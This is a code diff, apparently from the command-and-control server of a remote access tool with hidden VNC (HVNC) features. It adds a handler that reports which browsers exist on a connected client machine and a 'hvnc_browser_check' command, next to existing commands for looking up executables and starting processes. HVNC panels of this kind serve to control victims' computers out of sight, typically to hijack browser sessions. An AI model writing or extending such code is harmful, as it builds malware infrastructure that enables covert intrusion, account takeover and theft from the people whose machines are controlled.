@@ -610,6 +610,21 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCBrowserCheckResult(clientId: string, payload: any) {
+  const browsers: Record<string, boolean> = {};
+  if (payload.browsers && typeof payload.browsers === "object") {
+    for (const [key, val] of Object.entries(payload.browsers)) {
+      browsers[key] = !!val;
+    }
+  }
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_browser_check_result",
+      browsers,
+    });
+  }
+}
+
 export function handleHVNCDXGIStatus(clientId: string, payload: any) {
   for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
@@ -851,6 +866,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       break;
     case "hvnc_lookup":
       sendHVNCCommand(target, "hvnc_lookup", { exe: String(payload.exe || "") });
+      break;
+    case "hvnc_browser_check":
+      sendHVNCCommand(target, "hvnc_browser_check", {});
       break;
     case "hvnc_start_process":
       sendHVNCCommand(target, "hvnc_start_process", {
